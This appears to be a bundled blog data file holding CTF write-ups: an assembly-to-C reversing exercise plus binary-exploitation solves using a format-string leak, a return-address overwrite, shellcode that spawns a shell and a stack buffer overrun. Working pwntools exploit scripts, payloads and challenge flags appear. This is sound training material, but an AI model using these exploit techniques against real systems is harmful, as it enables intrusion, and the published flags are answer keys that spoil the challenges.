mov     eax, [rbp-0x14]\\n  mov     edi, eax\\n  call    toupper@plt.sec\\n  mov     rsi, rbx\\n  mov     edi, eax\\n  call    putc@plt.sec\\n  mov     [rbp-0x15], 0\\n  jmp     block1\\nblock6:\\n  mov     rbx, [stdout]\\n  mov     eax, [rbp-0x14]\\n  mov     edi, eax\\n  call    tolower@plt.sec\\n  mov     rsi, rbx\\n  mov     edi, eax\\n  call    putc@plt.sec\\n  jmp     block1\\nblock7:\\n  mov     eax, 0\\n  add     rsp, 0x18\\n  pop     rbx\\n  pop     rbp\\n  ret\\n```\\n\\n### Examining assembly components\\n\\n```assembly\\nmain:\\n  endbr64\\n  push    rbp\\n  mov     rbp, rsp\\n  push    rbx\\n  sub     rsp, 0x18\\n  mov     [rbp-0x15], 1\\n```\\n\\nFrom main, the stack was allocated and the value \'1\' is stored on the stack at `[rbp-0x15]`.\\n\\n```assembly\\nblock1:\\n  mov     rax, [stdin]\\n  mov     rdi, rax\\n  call    getc@plt.sec\\n  mov     [rbp-0x14], eax\\n  cmp     [rbp-0x14], -1\\n  je      block7\\n```\\n\\nIn block 1, getc is called with stdin as its argument. The return value of getc is moved from eax into `[rbp-0x14]`, a location on the stack. It checks the return value for the value \'-1\' and jumps to block 7 if it is equal. If it is not equal, the assembly control flow continues into block 2.\\n\\n```assembly\\nblock2:\\n  call    __ctype_b_loc@plt.sec\\n  mov     rax, [rax]\\n  mov     edx, [rbp-0x14]\\n  movsxd  rdx, edx\\n  add     rdx, rdx\\n  add     rax, rdx\\n  movzx   eax, [rax]\\n  movzx   eax, ax\\n  and     eax, 0x2000\\n  test    eax, eax\\n  je      block4\\n```\\n\\n`__ctype_b_loc` is an accessor function used by the ctype library. It returns an `unsigned short int**` which points to array of characters in the current locale containing characteristics for each current character set. The character that had been received from `getc` is used and its characteristic was checked to match `0x2000`. `0x2000` was the value for the `_ISspace` constant contained in ctype.h. From this I determined that the `isspace()` function was likely used to check that the character was a space. If this was true, the assembly would jump to block4. Otherwise, it continued to block 3.\\n\\n```assembly\\nblock3:\\n  mov     rdx, [stdout]\\n  mov     eax, [rbp-0x14]\\n  mov     rsi, rdx\\n  mov     edi, eax\\n  call    putc@plt.sec\\n  mov     [rbp-0x15], 1\\n  jmp     block1\\n```\\n\\nThis block simply called `putc` with the character we obtained from `getc` stored at `[rbp-0x14]`. It stored the value \'1\' into [rbp-0x15] and jumped back to block1. This implied that there was a loop in the main function.\\n\\n```assembly\\nblock4:\\n  cmp     [rbp-0x15], 0\\n  je      block6\\n```\\n\\nBlock4 checked that the value stored at `[rbp-0x15]` was 0 and jumped to block 6 if true. Otherwise, it continued to block 5. `[rbp-0x15]` gave me the impression that it was being used as a flag for something.\\n\\n```assembly\\nblock5:\\n  mov     rbx, [stdout]\\n  mov     eax, [rbp-0x14]\\n  mov     edi, eax\\n  call    toupper@plt.sec\\n  mov     rsi, rbx\\n  mov     edi, eax\\n  call    putc@plt.sec\\n  mov     [rbp-0x15], 0\\n  jmp     block1\\n```\\n\\nHere, `toupper()` was called with `stdout` and `[rbp-0x14`] as arguments. By this point we already knew that `[rbp-0x14]` is the character we obtain from `getc` stored on the stack. `putc` is then called to print the character. If `toupper` was successful, then this character would be capitalized. Otherwise, the character would be unchanged and printed to `stdout`.\\n\\n```assembly\\nblock6:\\n  mov     rbx, [stdout]\\n  mov     eax, [rbp-0x14]\\n  mov     edi, eax\\n  call    tolower@plt.sec\\n  mov     rsi, rbx\\n  mov     edi, eax\\n  call    putc@plt.sec\\n  jmp     block1\\n```\\n\\nThis was the same as block5. The only difference was that it called `tolower()` instead of `toupper()`.\\n\\n```assembly\\nblock7:\\n  mov     eax, 0\\n  add     rsp, 0x18\\n  pop     rbx\\n  pop     rbp\\n  ret\\n```\\n\\nBlock 7 was the point where the main function deallocated stack memory and returned. I expected this to be the end of the main function.\\n\\n### Running the executable\\n\\nI ran the executable and observed its behavior to compare my understanding of the assembly.\\n\\nThe first character of every `word` was capitalized if it was a letter. All uppercase letters after the first for each `word` were changed to lowercase. Words were separated by spaces.\\n\\nThis lined up with the assembly as a flag (`[rbp-0x15]`) handles the control flow for whether a character should be capitalized or made lowercase.\\n\\n## Solving the challenge\\n\\nI wrote up a program in c to match the executable\'s behavior along with what I knew from the assembly. I had to modify `if` statements a few times for the control flow to match in assembly.\\n\\n```c\\n#include <ctype.h>\\n#include <stdio.h>\\n\\nint main() {\\n  // glhf\\n  char flag;\\n  int letter;\\n  \\n  flag = 1;\\n  while (1)\\n  {\\n    letter = getc(stdin);\\n  \\n    if (letter == -1)\\n    {\\n      break;\\n    }\\n\\n    if (isspace(letter) != 0)\\n    {\\n     putc(letter, stdout);\\n     flag = 1;\\n    }\\n    else\\n    {\\n      if (flag != 0)\\n      {\\n        putc(toupper(letter), stdout);\\n        flag = 0;\\n      }\\n      else\\n      {\\n        putc(tolower(letter), stdout);\\n      }\\n    }\\n  }\\n\\n  return 0;\\n}\\n```\\n\\n## Conclusion\\n\\nThis was an interesting challenge and helped me gain a better understanding of the relationship between c and assembly. I learned about calling conventions and how to read the control flow of assembly."},{"id":"stonks","metadata":{"permalink":"/blog/stonks","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-02-14-stonks.md","source":"@site/blog/2022-02-14-stonks.md","title":"Stonks","description":"Pico CTF: Stonks","date":"2022-02-14T00:00:00.000Z","formattedDate":"February 14, 2022","tags":[{"label":"CTF","permalink":"/blog/tags/ctf"},{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"},{"label":"Pico CTF","permalink":"/blog/tags/pico-ctf"}],"readingTime":1.97,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"stonks","title":"Stonks","authors":["nguyen"],"tags":["CTF","Binary Exploitation","Pico CTF"]},"prevItem":{"title":"baby-c","permalink":"/blog/baby-c"},"nextItem":{"title":"Hidden Flag Function","permalink":"/blog/hidden_flag_function"}},"content":"Pico CTF: Stonks\\n\\n\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nThis challenge can be found [here](https://play.picoctf.org/practice/challenge/105?bookmarked=0&page=1&search=stonks).\\n\\nThe provided source file [here](/files/stonks/vuln.c)\\nGiven an application, the goal is to find the flag.\\n\\n## Analysis\\n\\nI first looked through the source file to get an idea of where the flag could be stored within the program. In main, the buy_stonks function opens a file and stores the flag into api_buf. The location of api_buf on the stack would be a point of interest.\\n\\n```c\\nint buy_stonks(Portfolio *p) {\\n    if (!p) {\\n        return 1;\\n    }\\n    char api_buf[FLAG_BUFFER];\\n    FILE *f = fopen(\\"api\\",\\"r\\");\\n    if (!f) {\\n        printf(\\"Flag file not found. Contact an admin.\\\\n\\");\\n        exit(1);\\n    }\\n    fgets(api_buf, FLAG_BUFFER, f);\\n\\n    int money = p->money;\\n    int shares = 0;\\n    Stonk *temp = NULL;\\n    printf(\\"Using patented AI algorithms to buy stonks\\\\n\\");\\n    while (money > 0) {\\n        shares = (rand() % money) + 1;\\n        temp = pick_symbol_with_AI(shares);\\n        temp->next = p->head;\\n        p->head = temp;\\n        money -= shares;\\n    }\\n    printf(\\"Stonks chosen\\\\n\\");\\n\\n    // TODO: Figure out how to read token from file, for now just ask\\n\\n    char *user_buf = malloc(300 + 1);\\n    printf(\\"What is your API token?\\\\n\\");\\n    scanf(\\"%300s\\", user_buf);\\n    printf(\\"Buying stonks with token:\\\\n\\");\\n    printf(user_buf);\\n\\n    // TODO: Actually use key to interact with API\\n\\n    view_portfolio(p);\\n\\n    return 0;\\n}\\n```\\n\\nThere is a printf vulnerability where `printf(user_buf)` is called. `scanf` stores input from stdin into user_buf, allowing us to manipulate the format string interpreted by the printf function. Entering %x as input resulted in the following output.\\n\\n![stonks %x output](/img/stonks/stonks_percent_x.png)\\n\\nThis worked because the x86 calling convention retrieves parameters requested in the format string from the stack. The `printf` function cannot determine a mismatch between the format string and the number of arguments provided in the `printf` function. The function does not have a marked boundary so it will fetch data that does not belong to the function call.\\n\\nThe output turned out to be an address on the stack. The location of api_buf was further up the stack so I hand jammed a lot of %x\'s into user_buf to try and find api_buf. Looking through the various data on the stack, I notice 6f636970. The converted output from hex to ascii resulted in \'ocip\' which meant that the machine was little endian. I read all the data from \'ocip\' until a null byte and obtained the flag. The exact offset was 56 bytes away from user_buf. The full flag was \'picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}\'."},{"id":"hidden_flag_function","metadata":{"permalink":"/blog/hidden_flag_function","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-02-08-hidden_flag_function.md","source":"@site/blog/2022-02-08-hidden_flag_function.md","title":"Hidden Flag Function","description":"247CTF: Hidden Flag Function","date":"2022-02-08T00:00:00.000Z","formattedDate":"February 8, 2022","tags":[{"label":"CTF","permalink":"/blog/tags/ctf"},{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"},{"label":"247ctf","permalink":"/blog/tags/247-ctf"}],"readingTime":2.67,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"hidden_flag_function","title":"Hidden Flag Function","authors":["nguyen"],"tags":["CTF","Binary Exploitation","247ctf"]},"prevItem":{"title":"Stonks","permalink":"/blog/stonks"},"nextItem":{"title":"Level 0","permalink":"/blog/level-0"}},"content":"247CTF: Hidden Flag Function\\n\\n\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nThis challenge can be found [here](https://247ctf.com/dashboard).\\n\\nGiven an application, the goal is to gain control of the application flow and gain access to the hidden flag function.\\n\\n## Analysis\\n\\nI plugged the provided program into Ghidra and looked at the function call graph. I started from _start() and then looked into the main function.\\n\\n![Main function](/img/hidden_flag_function_main.png)\\n\\nThe function `chall` takes user input by using scanf and stores it into a 68 byte buffer before returning. After some more digging, I find a function called flag.\\n\\n![Flag function](/img/hidden_flag_function_flag.png)\\n\\nThe scanf command from chall was a point of interest as I would have been able to overwrite the address stored in the return from function. I wanted the return to execute the flag function and get the flag.\\n\\nI ran the `file` command on the executable and found that it was 32 bit little endian. It did not state that the program was a position independent executable. I needed to install i386 architecture as I could not run it natively on my ubuntu 64 bit system.\\n\\n```bash\\nsudo dpkg --add-architecture i386\\nsudo apt-get update\\nsudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386\\n```\\n\\nI also set core_pattern in /proc/sys/kernel to output coredumps to a file named core. This is needed in order to help with determining offsets within the executable.\\n\\n## The Solve\\n\\n```python\\nfrom pwn import *\\n\\nexe = ELF(\\"./hidden_flag_function\\")\\n\\ncontext.binary = exe\\ncontext.log_level = \'info\'\\ncontext.terminal = [\'gnome-terminal\', \'-e\']\\n\\nCYCLIC_BYTES = 1000\\n\\ndef conn():\\n    \'\'\'Establish the connection to the process, local or remote.\\n    \'\'\'\\n\\n    if args.get(\'REMOTE\'):\\n        io = remote(\'40b14b3351586e58.247ctf.com\', 50175)\\n\\n    else:\\n        io = process([exe.path])\\n\\n    return io\\n\\n\\ndef main():\\n    \'\'\'Return the flag.\\n    \'\'\'\\n\\n    offset = get_offset()\\n    send_payload(offset)\\n\\n\\ndef get_offset():\\n    \'\'\'Get the offset\'\'\'\\n\\n    if args.get(\'REMOTE\'):\\n        return 76\\n\\n    with conn() as io:\\n        pat = cyclic(CYCLIC_BYTES, n=4)\\n        io.sendlineafter(b\\"What do you have to say?\\", pat)\\n        # Program will crash and output coredump\\n        io.wait()\\n        core = io.corefile\\n        offset_addr = core.fault_addr\\n        log.info(f\\"ADDR:{offset_addr}\\")\\n\\n        offset = cyclic_find(offset_addr, n=4)\\n        log.info(f\\"OFFSET:{offset}\\")\\n        return offset\\n\\n\\ndef send_payload(offset):\\n    \'\'\'Send offset payload with flag function address\'\'\'\\n    with conn() as io:\\n        flag_func = p32(exe.symbols[\'flag\'], endian=\'little\')\\n        log.info(f\\"{flag_func}\\")\\n        payload = fit({\\n            offset:flag_func\\n        })\\n\\n        io.sendlineafter(b\\"What do you have to say?\\", payload)\\n        io.interactive()\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\nFirst, I wanted to determine where the offset of scanf within the chall function was within the program. With the script above, I sent 1000 bytes using the cyclic pattern and attempted to crash the program. I parse the coredump for the address that caused the executable to crash. The executable will have crashed because chall\'s return address will have been overwritten. Chall\'s function stack is 76 bytes, consisting of the 68 byte array, the 4 byte FILE pointer, and the 4 byte stack pointer. The return address will be overwritten to be a subsequence of the pattern I sent with the usage of `cyclic`. Using `cyclic_find`, we find that the offset is 76 which matches what was expected.\\n\\nNow that I had the offset, I needed to determine the flag function\'s address. This can be done by looking up the flag symbol with pwnlib.elf.elf. The address obtained is packed in little endian with the offset and sent.\\n\\nSending this payload to the server gets me the flag \'247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}\'."},{"id":"level-0","metadata":{"permalink":"/blog/level-0","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-02-07-level-0.md","source":"@site/blog/2022-02-07-level-0.md","title":"Level 0","description":"CTF: Level 0","date":"2022-02-07T00:00:00.000Z","formattedDate":"February 7, 2022","tags":[{"label":"CTF","permalink":"/blog/tags/ctf"},{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"}],"readingTime":1.74,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"level-0","title":"Level 0","authors":["nguyen"],"tags":["CTF","Binary Exploitation"]},"prevItem":{"title":"Hidden Flag Function","permalink":"/blog/hidden_flag_function"},"nextItem":{"title":"Clutter Overflow","permalink":"/blog/clutter_overflow"}},"content":"CTF: Level 0\\n\\n\x3c!--truncate--\x3e\\n\\n[Executable used for the challenge](/files/level_0/level-0)\\n\\nTo download the challenge, right click the link and open in a new tab.\\n\\n## The Challenge\\n\\nLevel 0 provides an amd64 executable where the goal is to get the executable to open a shell.\\n\\n## Analysis\\n\\nI decided to first use ghidra to have a better understanding of the program. In ghidra, I look for _start() as that as normally the entry point of a program.\\n\\n![_start()](/img/level0_start.png)\\n\\n_start() calls main so I looked into main next.\\n\\n![main()](/img/level0_main.png)\\n\\nI looked into init_chal and found that SIGALRM is sent 30 seconds after running the program. I ran the program and waited to see what would happen. It resulted in an output of \'Alarm clock\' to the terminal before exiting the program. I noticed that the stdin and stdout buffers were both set to be unbuffered.\\n\\nI went back to the main function and noticed memory is allocated to a buffer through the usage of mmap. Looking into the arguments that are used in mmap, I saw that the prot field contained read, write, and execute for the page. The length of the mapping is 4096 bytes. After memory has been allocated, read is called to read stdin into the buffer up to 4096 bytes. The buffer is called as a function pointer to be executed before returning.\\n\\nThis makes it clear that I need to send instructions through stdin in order to open a shell.\\n\\nI accomplish this with the following code.\\n\\n```python\\nfrom pwn import *\\n\\nexe = ELF(\\"./level-0\\")\\n\\ncontext.binary = exe\\ncontext.log_level = \'info\'\\ncontext.terminal = [\'gnome-terminal\', \'-e\']\\n\\ndef conn():\\n    \'\'\'Establish the connection to the file\\n    \'\'\'\\n\\n    io = process([exe.path])\\n    return io\\n\\n\\ndef main():\\n    \'\'\'Pop open a shell\\n    \'\'\'\\n\\n    with conn() as io:\\n        shellcode = asm(shellcraft.amd64.linux.sh())\\n        io.sendline(shellcode)\\n        io.interactive()\\n\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\n`shellcraft.amd64.linux.sh()` contained the instructions for opening a shell and I used `asm()` in order to convert assembly into bytes. The shellcode is then sent directly to the program.\\n\\nI ran this script and was able to access a shell from within the level-0 program."},{"id":"clutter_overflow","metadata":{"permalink":"/blog/clutter_overflow","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-02-03-clutter-overflow.md","source":"@site/blog/2022-02-03-clutter-overflow.md","title":"Clutter Overflow","description":"Pico CTF: Clutter Overflow","date":"2022-02-03T00:00:00.000Z","formattedDate":"February 3, 2022","tags":[{"label":"CTF","permalink":"/blog/tags/ctf"},{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"},{"label":"Pico CTF","permalink":"/blog/tags/pico-ctf"}],"readingTime":1.85,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"clutter_overflow","title":"Clutter Overflow","authors":["nguyen"],"tags":["CTF","Binary Exploitation","Pico CTF"]},"prevItem":{"title":"Level 0","permalink":"/blog/level-0"}},"content":"Pico CTF: Clutter Overflow\\n\\n\x3c!--truncate--\x3e\\n\\nThe challenge can be found [here](https://play.picoctf.org/practice/challenge/1216)\\n\\n## The Challenge\\n\\nUpon running `nc mars.picoctf.net 31890`, I get the following output.\\n\\n![Clutter Overflow Startup](/img/clutter_overflow_start.png)\\n\\n## The Solve\\n\\n### Determining the objective\\n\\nFirst, I attempt to send the input of \'monkeys\' and receive this as output.\\n\\n![Clutter Overflow Initial Output](/img/clutter_overflow_ex_output.png)\\n\\nI take a look at the source as it is provided and see that the gets command is used to store the user input into the char buffer called \'clutter\'. \'clutter\' is a fixed size char array of length 100 and is vulnerable to buffer overruns.\\n\\n![Clutter Overflow Source Code](/img/clutter_overflow_source.png)\\n\\nIn order to get the flag, I know that I need to overrun the buffer and modify the data stored within \'code\' to be equal to 0xdeadbeef.\\n\\n### Reaching the objective\\n\\nI use python to create a script that establishes a connection to the challenge with the help of pwntools.\\n\\n```python\\nio = remote(\'mars.picoctf.net\', 31890)\\n```\\n\\nI know that I need to send data that is significantly larger then the size of clutter\'s size. I use pwntools to create a pattern with length 500 and a unique subsequence of 8 bytes because the variable \'code\' is 8 bytes.\\n\\n```python\\npat = cyclic(500, n=8)\\n```\\n\\nI send the pattern to the server and receive up to before \'code\' is printed.\\n\\n```python\\nio.sendlineafter(b\\"What do you see?\\", pat)\\n```\\n\\nI receive until the line that gives me the hex value of \'code\' and convert it into an integer.\\n\\n```python\\nio.recvuntil(b\'code == 0x\')\\n```\\n\\n```python\\ncode = io.recvline()\\nints = int(code.decode(), base=16)\\n```\\n\\nI print the value of ints and get \'7089054359331365225\' as the value.\\n\\nI search for this as the sebsequence of cyclic_find and store it in \'offset\'.\\n\\n```python\\noffset = cyclic_find(ints, 8)\\n```\\n\\nThe value of offset turns out to be 264 so \'code\' is 264 bytes away from \'clutter\' on the stack. Knowing this, I can now send the value 0xdeadbeef after the offset using the fit command.\\n\\n```python\\npayload = fit({\\n    offset:0xdeadbeef\\n})\\n```\\n\\nThe payload ends up as b\'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaac\\\\xef\\\\xbe\\\\xad\\\\xde\\\\x00\\\\x00\\\\x00\\\\x00\'\\n\\nI then send the payload to the server.\\n\\n```python\\nio.sendlineafter(b\\"What do you see?\\", payload)\\n```\\n\\nThe output matches as expected and I get the flag.\\n\\n![Clutter Overflow Flag](/img/clutter_overflow_flag.png)"}]}')}}]);